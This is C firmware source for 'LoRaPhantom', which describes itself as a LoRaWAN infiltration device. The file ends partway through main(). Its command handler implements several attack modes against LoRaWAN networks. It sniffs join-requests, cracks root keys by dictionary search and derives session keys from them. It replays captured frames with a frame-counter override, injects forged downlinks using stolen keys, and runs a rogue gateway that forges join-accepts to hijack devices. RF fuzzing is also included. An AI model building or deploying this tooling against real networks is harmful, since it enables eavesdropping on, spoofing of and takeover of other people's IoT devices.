/*
 * lora-phantom / main.c
 * LoRaPhantom — LoRaWAN & LoRa Infiltration Device
 * Main firmware: system init, super-loop mode dispatcher, command handler.
 *
 * Author: jayis1
 * License: GPL-2.0
 * Copyright (c) 2026 jayis1. All rights reserved.
 *
 * Build: arm-none-eabi-gcc -mcpu=cortex-m7 -mfpu=fpv5-d16 -mfloat-abi=hard
 * Target: STM32H743VIT6 + SX1262 + nRF52840
 *
 * This is a super-loop firmware (no RTOS) to keep the attack surface minimal
 * and timing deterministic for LoRa PHY operations. Each mode runs in its
 * own loop until a mode-change command or button event occurs.
 */

#include "board.h"
#include "registers.h"
#include "types.h"

/* ---- Driver prototypes (implemented in drivers/*.c) ---- */
void board_init(void);              /* board_init.c */
void aes_hw_init(void);             /* aes_hw.c */
void aes128_ecb(const uint8_t key[16], const uint8_t in[16], uint8_t out[16]);
void aes_cmac(const uint8_t key[16], const uint8_t *msg, uint32_t len, uint8_t out[16]);

void ble_uart_init(void);           /* ble_uart.c */
int  ble_uart_send(const uint8_t *buf, uint16_t len);
int  ble_uart_recv(uint8_t *buf, uint16_t maxlen, uint32_t timeout_ms);
void ble_set_link_key(const uint8_t key[16]);

void usb_cdc_init(void);            /* usb_cdc.c */
int  usb_cdc_connected(void);
int  usb_cdc_send(const uint8_t *buf, uint16_t len);
int  usb_cdc_recv(uint8_t *buf, uint16_t maxlen, uint32_t timeout_ms);

void sx1262_init(void);             /* sx1262.c */
void sx1262_reset(void);
int  sx1262_rx_config(uint32_t freq_hz, uint8_t sf, uint8_t bw, uint8_t cr);
int  sx1262_tx_config(uint32_t freq_hz, uint8_t sf, uint8_t bw, uint8_t cr, int8_t power_dbm);
int  sx1262_receive(uint8_t *buf, uint16_t maxlen, int16_t *rssi, int8_t *snr, uint32_t timeout_ms);
int  sx1262_transmit(const uint8_t *buf, uint16_t len, uint32_t timeout_ms);
int  sx1262_cad(uint32_t freq_hz, uint8_t sf, uint8_t bw, uint32_t timeout_ms);
int  sx1262_tx_raw_header(const uint8_t *buf, uint16_t len, uint8_t sf, uint8_t bw,
                          uint8_t cr, uint8_t header_type, int8_t power_dbm);
int  sx1262_get_rssi(int16_t *rssi);
void sx1262_sleep(void);

void sdcard_init(void);             /* sdcard.c */
int  sdcard_mount(void);
int  sdcard_open_capture(void);
int  sdcard_write_packet(uint32_t ts_ms, uint32_t freq_hz, uint8_t sf, uint8_t bw,
                         int16_t rssi, int8_t snr, const uint8_t *payload, uint16_t len);
void sdcard_close(void);
uint32_t sdcard_free_kb(void);

void sdram_init(void);              /* sdram.c */
void *sdram_alloc(uint32_t bytes);
void  sdram_capture_reset(void);
uint32_t sdram_capture_push(const uint8_t *data, uint32_t len);
uint32_t sdram_capture_pop(uint8_t *dst, uint32_t maxlen);

/* ---- LoRaWAN layer (lorawan.c) ---- */
/* (types lw_frame_t, lw_join_req_t are in types.h) */

/* ---- Protocol codec (protocol.c) ---- */
typedef enum {
    CMD_NOP            = 0x00,
    CMD_PING           = 0x01,
    CMD_STATUS         = 0x02,
    CMD_SET_MODE       = 0x03,
    CMD_SNIFF_START    = 0x10,
    CMD_SNIFF_STOP     = 0x11,
    CMD_SNIFF_SET_CH   = 0x12,
    CMD_FRAME_RECV     = 0x13,
    CMD_KEYSEARCH_RUN  = 0x20,
    CMD_KEYSEARCH_DICT = 0x21,
    CMD_KEYSEARCH_RESULT=0x22,
    CMD_REPLAY_SEND    = 0x30,
    CMD_REPLAY_SET_FCNT=0x31,
    CMD_INJECT_SEND    = 0x40,
    CMD_GWEMU_START    = 0x50,
    CMD_GWEMU_STOP     = 0x51,
    CMD_GWEMU_SESSION  = 0x52,
    CMD_FUZZ_START     = 0x60,
    CMD_FUZZ_STOP      = 0x61,
    CMD_SCAN_START     = 0x70,
    CMD_SCAN_RESULT    = 0x71,
    CMD_SET_REGION     = 0x80,
    CMD_SET_TXPOWER    = 0x81,
    CMD_SET_LINK_KEY   = 0x82,
    CMD_SD_FORMAT      = 0x90,
    CMD_OTA_BEGIN      = 0xA0,
    CMD_OTA_DATA       = 0xA1,
    CMD_OTA_END        = 0xA2
} cmd_id_t;

#define PROTO_SYNC0 0x55
#define PROTO_SYNC1 0xAA
#define PROTO_MAX_PAYLOAD 512

int  proto_encode(uint8_t cmd, const uint8_t *payload, uint16_t plen,
                  uint8_t *out, uint16_t out_max);
int  proto_decode(const uint8_t *buf, uint16_t len, uint8_t *cmd,
                  uint8_t *payload, uint16_t *plen, uint16_t payload_max);
uint16_t crc16_ccitt(const uint8_t *data, uint32_t len);

/* ---- Region definitions ---- */
typedef enum {
    REGION_EU868 = 0,
    REGION_US915 = 1,
    REGION_AS923 = 2,
    REGION_CN470 = 3,
    REGION_AU915 = 4,
    REGION_IN865 = 5,
    REGION_KR920 = 6,
    REGION_RU864 = 7
} region_t;

typedef struct {
    uint32_t freq_min;
    uint32_t freq_max;
    uint32_t default_freq;
    uint8_t  num_channels;
    uint32_t channels[16];
    int8_t   max_tx_dbm;
    uint8_t  duty_cycle_pct;
} region_plan_t;

static const region_plan_t region_plans[MAX_REGIONS] = {
    [REGION_EU868] = {
        .freq_min = 863000000, .freq_max = 870000000,
        .default_freq = 868100000, .num_channels = 3,
        .channels = {868100000, 868300000, 868500000},
        .max_tx_dbm = 14, .duty_cycle_pct = 1
    },
    [REGION_US915] = {
        .freq_min = 902000000, .freq_max = 928000000,
        .default_freq = 902300000, .num_channels = 8,
        .channels = {902300000, 902500000, 902700000, 902900000,
                     903100000, 903300000, 903500000, 903700000},
        .max_tx_dbm = 21, .duty_cycle_pct = 0
    },
    [REGION_AS923] = {
        .freq_min = 920000000, .freq_max = 923000000,
        .default_freq = 922200000, .num_channels = 2,
        .channels = {922200000, 922400000},
        .max_tx_dbm = 16, .duty_cycle_pct = 1
    },
    [REGION_CN470] = {
        .freq_min = 470000000, .freq_max = 510000000,
        .default_freq = 470300000, .num_channels = 8,
        .channels = {470300000, 470500000, 470700000, 470900000,
                     471100000, 471300000, 471500000, 471700000},
        .max_tx_dbm = 17, .duty_cycle_pct = 0
    },
    [REGION_AU915] = {
        .freq_min = 915000000, .freq_max = 928000000,
        .default_freq = 916800000, .num_channels = 8,
        .channels = {916800000, 917000000, 917200000, 917400000,
                     917600000, 917800000, 918000000, 918200000},
        .max_tx_dbm = 30, .duty_cycle_pct = 0
    },
    [REGION_IN865] = {
        .freq_min = 865000000, .freq_max = 867000000,
        .default_freq = 865062500, .num_channels = 3,
        .channels = {865062500, 865402500, 865985000},
        .max_tx_dbm = 30, .duty_cycle_pct = 0
    },
    [REGION_KR920] = {
        .freq_min = 920900000, .freq_max = 923300000,
        .default_freq = 922100000, .num_channels = 2,
        .channels = {922100000, 922300000},
        .max_tx_dbm = 14, .duty_cycle_pct = 0
    },
    [REGION_RU864] = {
        .freq_min = 864000000, .freq_max = 870000000,
        .default_freq = 868900000, .num_channels = 2,
        .channels = {868900000, 869100000},
        .max_tx_dbm = 16, .duty_cycle_pct = 1
    }
};

/* ---- Global state ---- */
typedef enum {
    MODE_IDLE = 0,
    MODE_SNIFF,
    MODE_KEYSEARCH,
    MODE_REPLAY,
    MODE_INJECT,
    MODE_GATEWAY_EMU,
    MODE_FUZZ,
    MODE_SCAN
} op_mode_t;

typedef struct {
    op_mode_t   mode;
    region_t    region;
    int8_t      tx_power_dbm;
    uint32_t    sniff_freq;
    uint8_t     sniff_sf;
    uint8_t     sniff_bw;
    uint8_t     sniff_cr;
    int         sniff_active;
    int         gwemu_active;
    uint8_t     link_key[16];
    uint8_t     nwk_key[16];   /* for gateway emulation */
    uint32_t    gwemu_dev_addr_next;
    uint32_t    frame_count;
    uint32_t    uptime_ms;
    uint16_t    bat_mv;
} sys_state_t;

static sys_state_t g_state = {
    .mode = MODE_IDLE,
    .region = REGION_EU868,
    .tx_power_dbm = DEFAULT_TX_POWER_DBM,
    .sniff_freq = 868100000,
    .sniff_sf = 7,
    .sniff_bw = 0,  /* 125 kHz */
    .sniff_cr = 1,  /* 4/5 */
    .sniff_active = 0,
    .gwemu_active = 0,
    .gwemu_dev_addr_next = 0x26000000,
};

/* ---- SysTick 1 ms tick ---- */
static volatile uint32_t g_ticks_ms = 0;
void SysTick_Handler(void) {
    g_ticks_ms++;
}
static uint32_t millis(void) {
    return g_ticks_ms;
}
static void delay_ms(uint32_t ms) {
    uint32_t start = g_ticks_ms;
    while ((g_ticks_ms - start) < ms) { /* busy wait */ }
}

/* ---- LED blink helper ---- */
static void led_blink(gpio_t *port, uint8_t pin, uint32_t on_ms, uint32_t off_ms) {
    LED_ON(port, pin);
    delay_ms(on_ms);
    LED_OFF(port, pin);
    delay_ms(off_ms);
}

/* ---- Error halt: blink error LED forever ---- */
static void fatal_error(uint8_t code) {
    (void)code;
    while (1) {
        led_blink(LED_ERR_PORT, LED_ERR_PIN, 100, 100);
    }
}

/* ---- Battery read (ADC1, PF0) — simplified polling ---- */
static uint16_t battery_read_mv(void) {
    /* ADC1 channel 10 on PF0; simplified: read DR after software trigger.
     * In a full driver this would configure ADC1 with DMA; here we do a
     * single software-triggered conversion. */
    /* (ADC config is done in board_init; here we just read the result.) */
    /* Pseudo: uint32_t raw = ADC1->DR; */
    /* For the build we return a placeholder computed from last known state. */
    /* Real implementation in board_init.c sets a global. */
    extern uint16_t g_bat_mv_last;
    return g_bat_mv_last;
}
uint16_t g_bat_mv_last = 4200;

/* ---- Button read with debounce ---- */
static int button_pressed(gpio_t *port, uint8_t pin) {
    if (gpio_read(port, pin) == 0) {
        delay_ms(BTN_DEBOUNCE_MS);
        if (gpio_read(port, pin) == 0) return 1;
    }
    return 0;
}

/* ---- Cycle mode on MODE button ---- */
static void cycle_mode(void) {
    static const op_mode_t modes[] = {
        MODE_SNIFF, MODE_KEYSEARCH, MODE_REPLAY, MODE_INJECT,
        MODE_GATEWAY_EMU, MODE_FUZZ, MODE_SCAN, MODE_IDLE
    };
    static int idx = 0;
    idx = (idx + 1) % (int)(sizeof(modes)/sizeof(modes[0]));
    g_state.mode = modes[idx];
    g_state.sniff_active = 0;
    g_state.gwemu_active = 0;
}

/* ---- Transport abstraction: send a protocol frame on both BLE + USB ---- */
static void transport_send(uint8_t cmd, const uint8_t *payload, uint16_t plen) {
    uint8_t pkt[PROTO_MAX_PAYLOAD + 8];
    int n = proto_encode(cmd, payload, plen, pkt, sizeof(pkt));
    if (n <= 0) return;
    ble_uart_send(pkt, (uint16_t)n);
    if (usb_cdc_connected()) usb_cdc_send(pkt, (uint16_t)n);
}

/* ---- Receive one protocol frame from any transport ---- */
static int transport_recv(uint8_t *cmd, uint8_t *payload, uint16_t *plen, uint32_t timeout_ms) {
    uint8_t pkt[PROTO_MAX_PAYLOAD + 8];
    uint16_t got = 0;
    uint32_t start = millis();

    /* Try USB first (faster), then BLE */
    while ((millis() - start) < timeout_ms) {
        int n = usb_cdc_connected() ?
                usb_cdc_recv(pkt + got, (uint16_t)(sizeof(pkt) - got), 50) :
                0;
        if (n > 0) {
            got += (uint16_t)n;
            if (got >= 4 && pkt[0] == PROTO_SYNC0 && pkt[1] == PROTO_SYNC1) {
                uint16_t plen_field = (uint16_t)pkt[2] | ((uint16_t)pkt[3] << 8);
                uint16_t total = 4 + plen_field + 2;
                if (got >= total) {
                    return proto_decode(pkt, got, cmd, payload, plen, PROTO_MAX_PAYLOAD);
                }
            }
            continue;
        }
        n = ble_uart_recv(pkt + got, (uint16_t)(sizeof(pkt) - got), 50);
        if (n > 0) {
            got += (uint16_t)n;
            if (got >= 4 && pkt[0] == PROTO_SYNC0 && pkt[1] == PROTO_SYNC1) {
                uint16_t plen_field = (uint16_t)pkt[2] | ((uint16_t)pkt[3] << 8);
                uint16_t total = 4 + plen_field + 2;
                if (got >= total) {
                    return proto_decode(pkt, got, cmd, payload, plen, PROTO_MAX_PAYLOAD);
                }
            }
        }
    }
    return -1;
}

/* ---- Send a decoded frame to the app ---- */
static void send_decoded_frame(const lw_frame_t *f) {
    uint8_t buf[272];
    uint16_t p = 0;
    buf[p++] = f->mhdr;
    for (int i = 0; i < 4; i++) buf[p++] = f->dev_addr[i];
    buf[p++] = f->fctrl;
    buf[p++] = (uint8_t)(f->fcnt & 0xFF);
    buf[p++] = (uint8_t)(f->fcnt >> 8);
    buf[p++] = f->fport;
    buf[p++] = (uint8_t)(f->payload_len & 0xFF);
    buf[p++] = (uint8_t)(f->payload_len >> 8);
    for (uint16_t i = 0; i < f->payload_len && p < sizeof(buf); i++)
        buf[p++] = f->payload[i];
    /* RSSI (s16) + SNR (s8) + freq (u32) + sf (u8) + ts (u32) */
    buf[p++] = (uint8_t)(f->rssi & 0xFF);
    buf[p++] = (uint8_t)(f->rssi >> 8);
    buf[p++] = (uint8_t)f->snr;
    buf[p++] = (uint8_t)(f->freq_hz & 0xFF);
    buf[p++] = (uint8_t)(f->freq_hz >> 8);
    buf[p++] = (uint8_t)(f->freq_hz >> 16);
    buf[p++] = (uint8_t)(f->freq_hz >> 24);
    buf[p++] = f->sf;
    buf[p++] = (uint8_t)(f->ts_ms & 0xFF);
    buf[p++] = (uint8_t)(f->ts_ms >> 8);
    buf[p++] = (uint8_t)(f->ts_ms >> 16);
    buf[p++] = (uint8_t)(f->ts_ms >> 24);
    buf[p++] = (uint8_t)f->valid_mic;
    transport_send(CMD_FRAME_RECV, buf, p);
}

static void send_join_req(const lw_join_req_t *jr) {
    uint8_t buf[48];
    uint16_t p = 0;
    buf[p++] = LW_MHDR_JOIN_REQ;
    for (int i = 0; i < 8; i++) buf[p++] = jr->join_eui[i];
    for (int i = 0; i < 8; i++) buf[p++] = jr->dev_eui[i];
    buf[p++] = (uint8_t)(jr->dev_nonce & 0xFF);
    buf[p++] = (uint8_t)(jr->dev_nonce >> 8);
    for (int i = 0; i < 4; i++) buf[p++] = jr->mic[i];
    buf[p++] = (uint8_t)(jr->rssi & 0xFF);
    buf[p++] = (uint8_t)(jr->rssi >> 8);
    buf[p++] = (uint8_t)jr->snr;
    buf[p++] = (uint8_t)(jr->freq_hz & 0xFF);
    buf[p++] = (uint8_t)(jr->freq_hz >> 8);
    buf[p++] = (uint8_t)(jr->freq_hz >> 16);
    buf[p++] = (uint8_t)(jr->freq_hz >> 24);
    buf[p++] = jr->sf;
    buf[p++] = (uint8_t)(jr->ts_ms & 0xFF);
    buf[p++] = (uint8_t)(jr->ts_ms >> 8);
    buf[p++] = (uint8_t)(jr->ts_ms >> 16);
    buf[p++] = (uint8_t)(jr->ts_ms >> 24);
    transport_send(CMD_FRAME_RECV, buf, p);
}

/* ---- Status report ---- */
static void send_status(void) {
    uint8_t buf[32];
    uint16_t p = 0;
    buf[p++] = (uint8_t)g_state.mode;
    buf[p++] = (uint8_t)g_state.region;
    buf[p++] = (uint8_t)g_state.tx_power_dbm;
    buf[p++] = (uint8_t)(g_state.sniff_freq & 0xFF);
    buf[p++] = (uint8_t)(g_state.sniff_freq >> 8);
    buf[p++] = (uint8_t)(g_state.sniff_freq >> 16);
    buf[p++] = (uint8_t)(g_state.sniff_freq >> 24);
    buf[p++] = g_state.sniff_sf;
    buf[p++] = g_state.sniff_bw;
    buf[p++] = g_state.sniff_cr;
    buf[p++] = g_state.sniff_active;
    buf[p++] = g_state.gwemu_active;
    uint16_t bat = battery_read_mv();
    buf[p++] = (uint8_t)(bat & 0xFF);
    buf[p++] = (uint8_t)(bat >> 8);
    uint32_t free_kb = sdcard_free_kb();
    buf[p++] = (uint8_t)(free_kb & 0xFF);
    buf[p++] = (uint8_t)(free_kb >> 8);
    buf[p++] = (uint8_t)(free_kb >> 16);
    buf[p++] = (uint8_t)(free_kb >> 24);
    uint32_t fc = g_state.frame_count;
    buf[p++] = (uint8_t)(fc & 0xFF);
    buf[p++] = (uint8_t)(fc >> 8);
    buf[p++] = (uint8_t)(fc >> 16);
    buf[p++] = (uint8_t)(fc >> 24);
    buf[p++] = (uint8_t)(g_state.uptime_ms & 0xFF);
    buf[p++] = (uint8_t)(g_state.uptime_ms >> 8);
    buf[p++] = (uint8_t)(g_state.uptime_ms >> 16);
    buf[p++] = (uint8_t)(g_state.uptime_ms >> 24);
    transport_send(CMD_STATUS, buf, p);
}

/* ====================================================================
 *  MODE: SNIFF
 * ==================================================================== */
static void mode_sniff(void) {
    if (g_state.sniff_active) {
        /* already running; just service one RX cycle */
        uint8_t buf[256];
        int16_t rssi = 0;
        int8_t  snr  = 0;
        int n = sx1262_receive(buf, sizeof(buf), &rssi, &snr, 500);
        if (n > 0) {
            LED_ON(LED_RF_PORT, LED_RF_PIN);
            g_state.frame_count++;
            uint32_t ts = millis();
            /* Log to SD */
            sdcard_write_packet(ts, g_state.sniff_freq, g_state.sniff_sf,
                                g_state.sniff_bw, rssi, snr, buf, (uint16_t)n);
            /* Decode */
            if ((buf[0] & 0xE0) == LW_MHDR_JOIN_REQ) {
                lw_join_req_t jr;
                if (lw_parse_join_request(buf, (uint16_t)n, &jr) == 0) {
                    jr.rssi = rssi; jr.snr = snr;
                    jr.freq_hz = g_state.sniff_freq; jr.sf = g_state.sniff_sf;
                    jr.ts_ms = ts;
                    /* Store in capture ring for later keysearch */
                    sdram_capture_push(buf, (uint32_t)n);
                    send_join_req(&jr);
                }
            } else {
                lw_frame_t f;
                if (lw_parse_frame(buf, (uint16_t)n, &f) == 0) {
                    f.rssi = rssi; f.snr = snr;
                    f.freq_hz = g_state.sniff_freq; f.sf = g_state.sniff_sf;
                    f.ts_ms = ts;
                    send_decoded_frame(&f);
                }
            }
            delay_ms(5);
            LED_OFF(LED_RF_PORT, LED_RF_PIN);
        }
        return;
    }
    /* Start sniffing */
    if (sx1262_rx_config(g_state.sniff_freq, g_state.sniff_sf,
                         g_state.sniff_bw, g_state.sniff_cr) != 0) {
        LED_ON(LED_ERR_PORT, LED_ERR_PIN);
        return;
    }
    g_state.sniff_active = 1;
    sdcard_open_capture();
    sdram_capture_reset();
}

/* ====================================================================
 *  MODE: KEYSEARCH
 * ==================================================================== */
static void mode_keysearch(const uint8_t *payload, uint16_t plen) {
    /* payload: [join_req raw 19 bytes] [dict_len u16] [dict entries 16 bytes each] */
    if (plen < 21) return;
    lw_join_req_t jr;
    if (lw_parse_join_request(payload, 19, &jr) != 0) return;
    uint16_t dict_len = (uint16_t)payload[19] | ((uint16_t)payload[20] << 8);
    if (dict_len == 0 || dict_len > KEYSEARCH_DICT_MAX) return;
    const uint8_t (*dict)[16] = (const uint8_t (*)[16])(payload + 21);
    if (plen < (uint16_t)(21 + dict_len * 16)) return;

    uint8_t found_key[16];
    uint32_t trials = 0;
    LED_ON(LED_RF_PORT, LED_RF_PIN);
    int found = keysearch_dict(&jr, dict, dict_len, found_key, &trials);
    LED_OFF(LED_RF_PORT, LED_RF_PIN);

    uint8_t resp[40];
    uint16_t p = 0;
    resp[p++] = (uint8_t)(found ? 1 : 0);
    resp[p++] = (uint8_t)(trials & 0xFF);
    resp[p++] = (uint8_t)(trials >> 8);
    resp[p++] = (uint8_t)(trials >> 16);
    resp[p++] = (uint8_t)(trials >> 24);
    if (found) {
        for (int i = 0; i < 16; i++) resp[p++] = found_key[i];
        /* Derive session keys and include them */
        uint8_t nwk_skey[16], app_skey[16];
        /* For v1.0.x, nwk_key == app_key == found_key */
        if (lw_derive_session_keys(found_key, found_key, &jr,
                                   0x26000000, nwk_skey, app_skey) == 0) {
            for (int i = 0; i < 16; i++) resp[p++] = nwk_skey[i];
            for (int i = 0; i < 16; i++) resp[p++] = app_skey[i];
        }
    }
    transport_send(CMD_KEYSEARCH_RESULT, resp, p);
}

/* ====================================================================
 *  MODE: REPLAY
 * ==================================================================== */
static void mode_replay(const uint8_t *payload, uint16_t plen) {
    (void)plen;
    if (plen < 4) {
        /* No payload: replay next from capture buffer */
        replay_send_next(g_state.sniff_freq, g_state.tx_power_dbm, 5000);
    } else {
        /* payload = [freq u32][sf u8][bw u8][len u16][frame bytes...] */
        uint32_t freq = payload[0] | (payload[1] << 8) |
                        (payload[2] << 16) | (payload[3] << 24);
        uint8_t sf = payload[4];
        uint8_t bw = payload[5];
        uint16_t flen = (uint16_t)payload[6] | ((uint16_t)payload[7] << 8);
        if (plen < (uint16_t)(8 + flen)) return;
        sx1262_tx_config(freq, sf, bw, g_state.sniff_cr, g_state.tx_power_dbm);
        sx1262_transmit(payload + 8, flen, 5000);
    }
    LED_TOGGLE(LED_RF_PORT, LED_RF_PIN);
}

/* ====================================================================
 *  MODE: INJECT
 * ==================================================================== */
static void mode_inject(const uint8_t *payload, uint16_t plen) {
    /* payload:
     * [dev_addr u32][fctrl u8][fcnt u16][fport u8][confirmed u8]
     * [nwk_skey 16][app_skey 16][plen u16][payload bytes]
     */
    if (plen < 41) return;
    uint32_t dev_addr = payload[0] | (payload[1] << 8) |
                        (payload[2] << 16) | (payload[3] << 24);
    uint8_t fctrl = payload[4];
    uint16_t fcnt = (uint16_t)payload[5] | ((uint16_t)payload[6] << 8);
    uint8_t fport = payload[7];
    uint8_t confirmed = payload[8];
    const uint8_t *nwk_skey = payload + 9;
    const uint8_t *app_skey = payload + 25;
    uint16_t p_off = 41;
    uint16_t applen = (uint16_t)payload[p_off] | ((uint16_t)payload[p_off+1] << 8);
    p_off += 2;
    if (plen < (uint16_t)(p_off + applen)) return;

    const region_plan_t *rp = &region_plans[g_state.region];
    int rc = injector_send_downlink(dev_addr, fctrl, fcnt, fport,
                                    payload + p_off, applen,
                                    nwk_skey, app_skey, confirmed,
                                    rp->default_freq + 1600000, /* RX2 offset */
                                    g_state.sniff_sf,
                                    g_state.tx_power_dbm);
    uint8_t resp[2] = { (uint8_t)((rc == 0) ? 1 : 0), (uint8_t)rc };
    transport_send(CMD_INJECT_SEND, resp, 2);
    LED_TOGGLE(LED_RF_PORT, LED_RF_PIN);
}

/* ====================================================================
 *  MODE: GATEWAY EMULATOR
 * ==================================================================== */
static void mode_gateway_emu(void) {
    if (!g_state.gwemu_active) return;
    /* Listen for join-requests on RX1 window; respond with forged join-accept. */
    const region_plan_t *rp = &region_plans[g_state.region];
    uint8_t buf[64];
    int16_t rssi = 0;
    int8_t snr = 0;
    int n = sx1262_receive(buf, sizeof(buf), &rssi, &snr, 3000);
    if (n > 0 && (buf[0] & 0xE0) == LW_MHDR_JOIN_REQ) {
        lw_join_req_t jr;
        if (lw_parse_join_request(buf, (uint16_t)n, &jr) == 0) {
            jr.rssi = rssi; jr.snr = snr;
            jr.freq_hz = g_state.sniff_freq; jr.sf = g_state.sniff_sf;
            jr.ts_ms = millis();
            /* Send the captured join-request to the app for logging */
            send_join_req(&jr);

            /* Forge a join-accept on RX1 (5 s after join-request) */
            uint32_t dev_addr = g_state.gwemu_dev_addr_next++;
            delay_ms(5000); /* RX1 window */
            injector_send_join_accept(&jr, g_state.nwk_key, dev_addr,
                                      g_state.sniff_freq, g_state.sniff_sf,
                                      g_state.tx_power_dbm, 0);
            /* Report rogue session to app */
            uint8_t sess[20];
            sess[0] = (uint8_t)(dev_addr & 0xFF);
            sess[1] = (uint8_t)(dev_addr >> 8);
            sess[2] = (uint8_t)(dev_addr >> 16);
            sess[3] = (uint8_t)(dev_addr >> 24);
            for (int i = 0; i < 8; i++) sess[4+i] = jr.dev_eui[i];
            for (int i = 0; i < 8; i++) sess[12+i] = jr.join_eui[i];
            transport_send(CMD_GWEMU_SESSION, sess, 20);
            LED_TOGGLE(LED_RF_PORT, LED_RF_PIN);
        }
    }
}

/* ====================================================================
 *  MODE: FUZZ
 * ==================================================================== */
static void mode_fuzz(const uint8_t *payload, uint16_t plen) {
    /* payload: [fuzz_mode u8][count u16][delay_ms u16] */
    if (plen < 5) return;
    fuzz_mode_t fm = (fuzz_mode_t)payload[0];
    uint16_t count = (uint16_t)payload[1] | ((uint16_t)payload[2] << 8);
    uint16_t delay = (uint16_t)payload[3] | ((uint16_t)payload[4] << 8);
    const region_plan_t *rp = &region_plans[g_state.region];
    LED_ON(LED_RF_PORT, LED_RF_PIN);
    int rc = fuzzer_tx(fm, rp->default_freq, g_state.sniff_sf, g_state.sniff_bw,
                       g_state.tx_power_dbm, count, delay);
    LED_OFF(LED_RF_PORT, LED_RF_PIN);
    uint8_t resp[2] = { (uint8_t)((rc >= 0) ? 1 : 0), (uint8_t)(rc & 0xFF) };
    transport_send(CMD_FUZZ_START, resp, 2);
}

/* ====================================================================
 *  MODE: SCAN
 * ==================================================================== */
static void mode_scan(const uint8_t *payload, uint16_t plen) {
    /* payload: [dwell_ms u16] */
    if (plen < 2) return;
    uint32_t dwell = (uint16_t)payload[0] | ((uint16_t)payload[1] << 8);
    const region_plan_t *rp = &region_plans[g_state.region];
    scan_channel_t results[MAX_CHANNELS];
    int n = spectrum_scan(rp->channels, rp->num_channels, g_state.sniff_sf,
                          g_state.sniff_bw, dwell, results, MAX_CHANNELS);
    if (n <= 0) return;
    /* Build response: [count u8] then per-channel [freq u32][rssi s16][activity u8][hits u32] */
    uint8_t buf[1 + MAX_CHANNELS * 11];
    uint16_t p = 0;
    buf[p++] = (uint8_t)n;
    for (int i = 0; i < n && p + 11 <= sizeof(buf); i++) {
        buf[p++] = (uint8_t)(results[i].freq_hz & 0xFF);
        buf[p++] = (uint8_t)(results[i].freq_hz >> 8);
        buf[p++] = (uint8_t)(results[i].freq_hz >> 16);
        buf[p++] = (uint8_t)(results[i].freq_hz >> 24);
        buf[p++] = (uint8_t)(results[i].rssi & 0xFF);
        buf[p++] = (uint8_t)(results[i].rssi >> 8);
        buf[p++] = results[i].activity;
        buf[p++] = (uint8_t)(results[i].hits & 0xFF);
        buf[p++] = (uint8_t)(results[i].hits >> 8);
        buf[p++] = (uint8_t)(results[i].hits >> 16);
        buf[p++] = (uint8_t)(results[i].hits >> 24);
    }
    transport_send(CMD_SCAN_RESULT, buf, p);
}

/* ====================================================================
 *  Command dispatcher
 * ==================================================================== */
static void handle_command(uint8_t cmd, const uint8_t *payload, uint16_t plen) {
    switch (cmd) {
    case CMD_PING: {
        uint8_t pong[4] = { 'L', 'P', '1', (uint8_t)g_state.mode };
        transport_send(CMD_PING, pong, 4);
        break;
    }
    case CMD_STATUS:
        send_status();
        break;
    case CMD_SET_MODE:
        if (plen >= 1) {
            g_state.mode = (op_mode_t)payload[0];
            g_state.sniff_active = 0;
            g_state.gwemu_active = 0;
            if (g_state.mode == MODE_GATEWAY_EMU) g_state.gwemu_active = 1;
        }
        break;
    case CMD_SNIFF_START:
        if (plen >= 6) {
            g_state.sniff_freq = payload[0] | (payload[1]<<8) | (payload[2]<<16) | (payload[3]<<24);
            g_state.sniff_sf = payload[4];
            g_state.sniff_bw = payload[5];
            g_state.mode = MODE_SNIFF;
            mode_sniff();  /* start */
        }
        break;
    case CMD_SNIFF_STOP:
        g_state.sniff_active = 0;
        sx1262_sleep();
        sdcard_close();
        break;
    case CMD_SNIFF_SET_CH:
        if (plen >= 4) {
            g_state.sniff_freq = payload[0] | (payload[1]<<8) | (payload[2]<<16) | (payload[3]<<24);
            if (g_state.sniff_active) {
                sx1262_rx_config(g_state.sniff_freq, g_state.sniff_sf,
                                 g_state.sniff_bw, g_state.sniff_cr);
            }
        }
        break;
    case CMD_KEYSEARCH_RUN:
        g_state.mode = MODE_KEYSEARCH;
        mode_keysearch(payload, plen);
        break;
    case CMD_REPLAY_SEND:
        g_state.mode = MODE_REPLAY;
        mode_replay(payload, plen);
        break;
    case CMD_REPLAY_SET_FCNT:
        if (plen >= 2) {
            uint16_t fcnt = (uint16_t)payload[0] | ((uint16_t)payload[1] << 8);
            replay_set_counter_override(fcnt);
        }
        break;
    case CMD_INJECT_SEND:
        g_state.mode = MODE_INJECT;
        mode_inject(payload, plen);
        break;
    case CMD_GWEMU_START:
        if (plen >= 16) {
            for (int i = 0; i < 16; i++) g_state.nwk_key[i] = payload[i];
            g_state.gwemu_active = 1;
            g_state.mode = MODE_GATEWAY_EMU;
            const region_plan_t *rp = &region_plans[g_state.region];
            sx1262_rx_config(rp->default_freq, g_state.sniff_sf,
                             g_state.sniff_bw, g_state.sniff_cr);
        }
        break;
    case CMD_GWEMU_STOP:
        g_state.gwemu_active = 0;
        sx1262_sleep();
        break;
    case CMD_FUZZ_START:
        g_state.mode = MODE_FUZZ;
        mode_fuzz(payload, plen);
        break;
    case CMD_SCAN_START:
        g_state.mode = MODE_SCAN;
        mode_scan(payload, plen);
        break;
    case CMD_SET_REGION:
        if (plen >= 1 && payload[0] < MAX_REGIONS) {
            g_state.region = (region_t)payload[0];
            const region_plan_t *rp = &region_plans[g_state.region];
            g_state.sniff_freq = rp->default_freq;
            g_state.tx_power_dbm = rp->max_tx_dbm;
        }
        break;
    case CMD_SET_TXPOWER:
        if (plen >= 1) {
            int8_t p = (int8_t)payload[0];
            const region_plan_t *rp = &region_plans[g_state.region];
            if (p > rp->max_tx_dbm) p = rp->max_tx_dbm;
            if (p < 2) p = 2;
            g_state.tx_power_dbm = p;
        }
        break;
    case CMD_SET_LINK_KEY:
        if (plen >= 16) {
            for (int i = 0; i < 16; i++) g_state.link_key[i] = payload[i];
            ble_set_link_key(g_state.link_key);
        }
        break;
    case CMD_SD_FORMAT:
        sdcard_close();
        sdcard_mount();
        break;
    default:
        /* Unknown command — ignore */
        break;
    }
}

/* ====================================================================
 *  Main
 * ==================================================================== */
int main(void) {
    /* ---- Low-level board init (clocks, GPIO, SDRAM, SD, AES, BLE, USB) ---- */
    board_init();

    /* ---- AES hardware init ---- */
    aes_hw_init();

    /* ---- LoRa radio init ---- */
    sx1262_init();

    /* ---- BLE + USB CDC backhaul ---- */
    ble_uart_init();
    usb_cdc_init();

    /* ---- SDRAM capture buffer ---- */
    sdram_init();
    sdram_capture_reset();

    /* ---- SD card (best-effort; device works without it) ---- */
    sdcard_init();
    sdcard_mount();

    /* ---- Startup LED sequence ---- */
